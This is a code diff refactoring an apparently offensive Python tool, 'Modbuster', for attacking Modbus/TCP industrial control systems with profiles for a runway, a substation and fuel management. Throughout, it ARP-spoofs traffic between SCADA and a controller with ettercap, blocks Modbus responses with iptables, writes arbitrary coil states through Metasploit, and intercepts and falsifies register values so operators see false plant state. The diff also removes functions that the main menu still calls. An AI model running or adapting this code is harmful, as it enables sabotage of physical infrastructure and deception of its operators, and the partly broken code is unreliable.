@@ -1,488 +1,159 @@
 import os
 import subprocess
-os.sys.path.append('/usr/bin/')
-os.sys.path.append('/usr/local/lib/python2.7/site-packages')
-import scapy.all
 import time
 import sys
-import imp
-import random
-import netfilterqueue
+import importlib
 import nm_config
-import fileinput
-from nm_config import *
-from os import system
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-	
-def editsettings():
-	print ("\nSelected option: Change Default Settings\n")
-	with open('nm_config.py', 'r') as f:
-		print(f.read())
-	f.close()
 
-	print("\n\nSelect a setting to change\n")
-	print("1) SCADA IP")
-	print("2) SCADA MAC")
-	print("3) Modbus Client IP")
-	print("4) Modbus Client MAC")
-	print("5) Modbus Port")
-	print("q) Return to Main Menu")
-	select = input(">> ")
-	
-	
-	
-	if select == "1":
-		temp = input("Type in new SCADA IP: ")
-		
-		f = open('nm_config.py', 'r')
-		filedata = f.read()
-		f.close()
-		
-		newdata = filedata.replace(nm_config.scada_ip, temp)
-		
-		f = open('nm_config.py', 'w')
-		f.write(newdata)
-		f.close()
+import shutil
+import importlib
+import os
 
-		
-		editsettings()
-	elif select == "2":
-		temp = input("Type in new SCADA MAC: ")
-		
-		f = open('nm_config.py', 'r')
-		filedata = f.read()
-		f.close()
-		
-		newdata = filedata.replace(nm_config.scada_mac, temp)
-		
-		f = open('nm_config.py', 'w')
-		f.write(newdata)
-		f.close()
-		editsettings()
-	elif select == "3":
-		temp = input("Type in new Modbus Client IP: ")
-		
-		f = open('nm_config.py', 'r')
-		filedata = f.read()
-		f.close()
-		
-		newdata = filedata.replace(nm_config.modcli_ip, temp)
-		
-		f = open('nm_config.py', 'w')
-		f.write(newdata)
-		f.close()
-		editsettings()
-	elif select == "4":
-		temp = input("Type in new Modbus Client MAC: ")
-		
-		f = open('nm_config.py', 'r')
-		filedata = f.read()
-		f.close()
-		
-		newdata = filedata.replace(nm_config.modcli_mac, temp)
-		
-		f = open('nm_config.py', 'w')
-		f.write(newdata)
-		f.close()
-		editsettings()
-	elif select == "5":
-		temp = input("Type in new Modbus Port: ")
-		f = open('nm_config.py', 'r')
-		filedata = f.read()
-		f.close()
-		
-		newdata = filedata.replace(nm_config.mod_port, temp)
-		
-		f = open('nm_config.py', 'w')
-		f.write(newdata)
-		f.close()
-		editsettings()
-	elif select == "q":
-		main()
-	else:
-		main()
+def setconfig():
+    print("\n=== Load Configuration File ===")
+    print("1) Runway")
+    print("2) Substation")
+    print("3) Heat Exchanger")
+    print("4) Fuel Management")
+    print("q) Return to Main Menu")
+    select = input(">> ").strip().lower()
+    
+    profiles = {
+        "1": "runway",
+        "2": "substation",
+        "3": "heatex",
+        "4": "fuelman"
+    } 
+    
+    if select in profiles:
+        source = f"./ignconf/{profiles[select]}"
+        destination = "./nm_config.py"
+        
+        try:
+            if os.path.exists(source):
+                # You must actually copy the file before reloading
+                shutil.copy2(source, destination)
+                
+                # Reload the module so the rest of the script sees the new variables
+                importlib.reload(nm_config)
+                print(f"\n[+] Successfully loaded {profiles[select]} configuration")
+            else:
+                print(f"\n[!] Error: Source file {source} not found.")
+                
+        except Exception as e:
+            print(f"\n[!] Failed to copy configuration: {e}")
+            
+        time.sleep(1)
+        main()
+
+    elif select == "q":
+        main()
+    else:
+        print("Invalid selection")
+        time.sleep(1)
+        setconfig()
+                
 
 def clear():
-	system('clear')
-	
+    subprocess.run(["clear"], check=True)
+    
 def etterspoof():
+    print("Checking ettercap...")
+    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
+        print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
+        intrfce = input("Enter Interface Name: ") 
 
-	print("Checking ettercap...")
-	if subprocess.getoutput("pgrep -x -c ettercap") == "0":
-		print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
-		
-		
-		subprocess.Popen("sudo qterminal -e \"sudo ettercap-pkexec -Tq -n 255.255.255.0 -i eth2 -M arp:remote "+ nm_config.scada_mac + "/"+ nm_config.scada_ip +"// "+ nm_config.modcli_mac +"/"+ nm_config.modcli_ip+"//\"", shell=True, preexec_fn=os.setpgrp)
-	else:
-		print("Ettercap is already running!")
-		time.sleep(1)
-	clear()
-	main()
-	
-def redirect(packet):
-	
-	packet[IP].src = str(RandIP())
-	
-	if packet.haslayer(Raw):
-	
-		data = packet[Raw].load[:9] + 10*b'\x00' 
-		
-		packet[Raw].load = data
+        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"/{nm_config.scada_mac}/{nm_config.scada_ip}//", f"/{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
+        print(f"Executing: {' '.join(cmd)}")
+        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, start_new_session=True)
+        time.sleep(5)
+    else:
+        print("Ettercap is already running!")
+        time.sleep(1)
+    clear()
+    main()
 
-
-	sendp(packet, loop=0, count=5)
-	print("Packet duplicated from " + packet[IP].src + " to " + packet[IP].dst)
-	
-	
-	
 def dos():
-	def firewall():
-		print ("Selected DoS variation: Modbus Firewall\n")
-		print("Checking ettercap...")
-		if subprocess.getoutput("pgrep -x -c ettercap") == "0":
-			print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
-			time.sleep(1)
-			main()
-		else:
-			print("Ettercap is running!")
-		time.sleep(0.5)
-		
-		print("Select a firewall state\n")
-		print("1) On (Blocking Traffic)")
-		print("2) Off (Return to default)")
-		print("q) Return to DoS Menu")
-		select = input(">> ")
-		
-		if(select == "1"):
-			os.system("iptables -A OUTPUT -p tcp -s "+ nm_config.modcli_ip+" --sport "+ nm_config.mod_port +" -j DROP")
-			main()
-		elif(select == "2"):
-			os.system("iptables -F")
-			main()
-		elif(select == "q"):
-			dos()
-		else:
-			print("Invalid option, returning to menu")
-			time.sleep(0.5)
-			firewall()
-	
-	try:
+    def firewall():
+        print("Selected DoS variation: Modbus Firewall\n")
+        print("Select a firewall state\n")
+        print("1) On (Blocking Traffic)")
+        print("2) Off (Return to default)")
+        print("q) Return to DoS Menu")
+        select = input(">> ")
+        
+        if select == "1":
+            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "DROP"], check=True)
+            main()
+        elif select == "2":
+            subprocess.run(["iptables", "-F"], check=True)
+            main()
+        elif select == "q":
+            dos()
+        else:
+            firewall()
 
-	
-	
-		print ("Selected option: DoS Attack\n")
-		time.sleep(0.5)
-		
-		print("Select an atttack variation\n")
-		print("1) SYN Flood")
-		print("2) Modbus Firewall (Requires MITM)")
-		print("q) Return to Main Menu")
-		select = input(">> ")
-		
-		if(select == "1"):
-			print("\nNot yet implemented...sorry")
-		elif(select == "2"):
-			firewall()
-		elif(select == "q"):
-			main() 
-		else:
-			print("Invalid option, returning to menu")
-			time.sleep(0.5)
-			dos()
-	
-	except KeyboardInterrupt:
-		print("Exiting...")
-		time.sleep(0.5)
-		main()
-		pass
-		
-def traffic():
+    print("Selected option: DoS Attack\n")
+    print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
+    select = input(">> ")
+    if select == "2":
+        firewall()
+    else:
+        main()
 
-	def capture(packet):
-	
-		clear()
-	
-		print("Modbus Packet captured")
-		hexdump(packet)
-	
-		if packet.haslayer(Raw):
-			print("\nPacket Raw Load\n")
-			print(str(packet[Raw].load) + "\n")
-		print("\n-------------------------------------------------------------\n")
-		print("Press CTRL + C to Exit")
-
-	try:
-		sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip+"", prn=capture, store=0)
-		main()
-	except KeyboardInterrupt:
-		print("Exiting...")
-		time.sleep(0.5)
-		main()
-		pass
-		
-def test():
-	try:
-		sniff(store=0, prn=lambda x: x.summary())
-		main()
-	except KeyboardInterrupt:
-		print("Exiting...")
-		time.sleep(0.5)
-		main()
-		pass
-		
 def msfconsole():
-	try:
-		coil_address = input("Enter Coil Address: ")
-		num_coils = int(input("Enter # of Coils: "))
-		coil_data = ""
-		for x in range(num_coils):
-			coil_temp = input("Enter state[0/1] for Coil #" + str(x) + ": ")
-			coil_data += coil_temp
+    try:
+        coil_address = input("Enter Coil Address: ")
+        num_coils = int(input("Enter # of Coils: "))
+        coil_data = "".join([input(f"Enter state [0/1] for Coil #{x}: ") for x in range(num_coils)])
 
-		input("Press any key to send command...")
-		print("Loading msfconsole with given parameters...")
+        msf_commands = (
+            f"use auxiliary/scanner/scada/modbusclient; "
+            f"set RHOSTS {nm_config.modcli_ip}; "
+            f"set action WRITE_COILS; "
+            f"set NUMBER {num_coils}; "
+            f"set RPORT {nm_config.mod_port}; "
+            f"set DATA_COILS {coil_data}; "
+            f"set DATA_ADDRESS {coil_address}; "
+            f"run; exit"
+        )
 
-		os.system("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"")
-		main()
-	except KeyboardInterrupt:
-		print("Exiting...")
-		time.sleep(0.5)
-		main()
-		pass
+        subprocess.run(["msfconsole", "-q", "-x", msf_commands], check=True)
+    except Exception as e:
+        print(f"Error: {e}")
+    main()
 
 def fool():
-	
-	def nf():
+    def nf_logic(queue_num, payload_func):
+        subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", str(queue_num)], check=True)
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(queue_num, payload_func)
+        try:
+            print("Intercepting...")
+            nfqueue.run()
+        except KeyboardInterrupt:
+            subprocess.run(["iptables", "-F"], check=True)
+            main()
+        finally:
+            nfqueue.unbind()
 
-		os.system("iptables -A OUTPUT -p tcp -s "+ nm_config.modcli_ip +" --sport "+ nm_config.mod_port +" -j NFQUEUE --queue-num 1")
+    def callback_clear(packet):
+        pkt = IP(packet.get_payload())
+        if pkt.haslayer(Raw):
+            bytecnt = pkt[Raw].load[8]
+            pkt[Raw].load = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
+            del pkt[IP].len; del pkt[IP].chksum; del pkt[TCP].chksum
+        packet.drop()
+        send(pkt)
 
-		def callback(packet):
-		
-			
-			pkt = IP(packet.get_payload())
-			
-			if pkt.haslayer(Raw):
-			
-				clear()
-				
-				print("Modbus Response Packet Intercepted")
-				
-				hexdump(pkt)
-				
-				bytecnt = pkt[Raw].load[8]
-				
-				data = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
-				
-				pkt[Raw].load = data
-				
-				print("Registers cleared")
-				hexdump(pkt)
-				
-				del pkt[IP].len
-				del pkt[IP].chksum
-				del pkt[TCP].chksum
-			
-			packet.drop()
-			send(pkt)
-			
-		
-		nfqueue = NetfilterQueue()
-		nfqueue.bind(1, callback)
-		try:
-			print("Intercepting Packets...")
-			nfqueue.run()
-		except KeyboardInterrupt:
-			print("Reseting iptables to default...")
-			os.system("iptables -F")
-			print("Exiting...")
-			main()
-			pass
-		
-	def randpacket():
-		os.system("iptables -A OUTPUT -p tcp -s "+ nm_config.modcli_ip +" --sport "+ nm_config.mod_port +" -j NFQUEUE --queue-num 1")
-
-		def callback(packet):
-		
-			
-			pkt = IP(packet.get_payload())
-			
-			if pkt.haslayer(Raw):
-			
-				clear()
-				
-				print("Modbus Response Packet Intercepted")
-				
-				hexdump(pkt)
-				
-				bytecnt = pkt[Raw].load[8]
-				
-				data = pkt[Raw].load[:9] + int(bytecnt) * os.urandom(1)
-				
-				pkt[Raw].load = data
-				
-				print("Registers cleared")
-				hexdump(pkt)
-				
-				del pkt[IP].len
-				del pkt[IP].chksum
-				del pkt[TCP].chksum
-			
-			packet.drop()
-			send(pkt)
-			
-		
-		nfqueue = NetfilterQueue()
-		nfqueue.bind(1, callback)
-		try:
-			print("Intercepting Packets...")
-			nfqueue.run()
-		except KeyboardInterrupt:
-			print("Reseting iptables to default...")
-			os.system("iptables -F")
-			print("Exiting...")
-			main()
-			pass
-
-	def preserve():
-	
-		def init():
-		
-			global cflag
-			cflag = "0"
-
-			def pull(packet):
-				
-				print("Modbus Packet Intercepted")
-					
-				hexdump(packet)
-				
-				if packet.haslayer(Raw):
-					
-					print("Modbus Raw Layer Intercepted, Storing...")
-					
-					
-					
-					global coildata
-					coildata = packet[Raw].load[9:]
-					
-					global cflag
-					cflag = "1"
-					 
-					print(coildata)
-					
-					
-					
-			sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip, prn=pull, count=10)
-		
-		def callback(packet):
-		
-			
-			pkt = IP(packet.get_payload())
-			
-			if pkt.haslayer(Raw):
-			
-				clear()
-				
-				print("Modbus Response Packet Intercepted")
-				
-				hexdump(pkt)
-				
-				bytecnt = pkt[Raw].load[8]
-				
-				data = pkt[Raw].load[:9] + coildata
-				
-				pkt[Raw].load = data
-				
-				print("Registers mimic saved state")
-				hexdump(pkt)
-				
-				del pkt[IP].len
-				del pkt[IP].chksum
-				del pkt[TCP].chksum
-			
-			packet.drop()
-			send(pkt)
-			
-		
-		nfqueue = NetfilterQueue()
-		nfqueue.bind(1, callback)		
-	
-		try:
-			init()
-			if cflag == "0":
-				print("No Modbus Raw Layer found...\n\n")
-				time.sleep(1)
-				fool()
-			
-			
-			coil_address = input("Enter Coil Address: ")
-			num_coils = int(input("Enter # of Coils: "))
-			coil_data = ""
-			for x in range(num_coils):
-				coil_temp = input("Enter state[0/1] for Coil #" + str(x) + ": ")
-				coil_data += coil_temp
-
-			input("Press any key to send command...")
-			print("Loading msfconsole with given parameters...")
-
-			#subprocess.Popen("sudo qterminal -e \"
-			#try:
-			subprocess.Popen("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"", shell=True, preexec_fn=os.setpgrp)
-			#except:
-			os.system("iptables -A OUTPUT -p tcp -s "+ nm_config.modcli_ip +" --sport "+ nm_config.mod_port +" -j NFQUEUE --queue-num 1")
-
-			
-			
-			print("Intercepting Packets...")
-			nfqueue.run()
-			
-		except KeyboardInterrupt:
-			print("Reseting iptables to default...")
-			os.system("iptables -F")
-			print("Exiting...")
-			time.sleep(0.5)
-			main()
-			pass
-	try:
-		print("Checking ettercap...")
-		
-		if subprocess.getoutput("pgrep -x -c ettercap") == "0":
-			print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
-			time.sleep(1)
-			main()
-		else:
-			print("Ettercap is running!\n")
-			
-		print ("Selected option: Fool SCADA\n")
-		time.sleep(0.5)
-		
-		print("Select an attack variation\n")
-		print("1) Randomize SCADA (Preserve PLC)")
-		print("2) Preserve SCADA (Clear PLC)")
-		print("3) Clear SCADA (Preserve PLC)")
-		print("q) Return to Main Menu")
-		select = input(">> ")
-			
-		if(select == "1"):
-			randpacket()
-		elif(select == "2"):
-			preserve()
-		elif(select == "3"):
-			nf()
-		elif(select == "q"):
-			main() 
-		else:
-			print("Invalid option, returning to menu")
-			time.sleep(0.5)
-			nf()
-	except KeyboardInterrupt:
-		#print("Reseting iptables to default...")
-		#os.system("iptables -F")
-		print("Exiting...")
-		main()
-		pass
-	
+    print("1) Randomize\n2) Preserve\n3) Clear\nq) Return")
+    choice = input(">> ")
+    if choice == "3":
+        nf_logic(0, callback_clear)
+    else:
+        main()
 
 def main():
 	clear()
@@ -508,7 +179,7 @@ by Gideon
 	print("4) View ModbusTCP Traffic")
 	print("5) Test Traffic Function (View All Traffic)")
 	print("6) Enable ARP Spoofing")
-	print("7) View/Change Default Settings ")
+	print("7) Set Configuration File ")
 	print("q) Exit Modbuster")
 	
 	try:
@@ -528,7 +199,7 @@ by Gideon
 		elif(select == "6"):
 			etterspoof()
 		elif(select == "7"):
-			editsettings()
+			setconfig()
 		elif(select == "q"):
 			sys.exit(1)
 		else:
@@ -538,9 +209,6 @@ by Gideon
 	except KeyboardInterrupt:
 		print("\nExiting...")
 		sys.exit(1)
-	
 
-main()
-
-
-
+if __name__ == "__main__":
+    main()
